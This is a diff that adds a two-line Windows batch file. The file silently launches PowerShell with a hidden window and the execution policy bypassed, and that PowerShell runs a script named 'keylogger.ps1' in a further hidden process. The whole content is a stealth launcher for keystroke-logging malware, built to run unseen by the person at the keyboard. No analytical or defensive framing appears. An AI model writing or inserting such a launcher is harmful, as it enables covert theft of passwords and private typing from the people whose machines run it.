@@ -1,0 +1,2 @@
+@echo off
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File keylogger.ps1' -WindowStyle Hidden; Start-Sleep 1; exit"
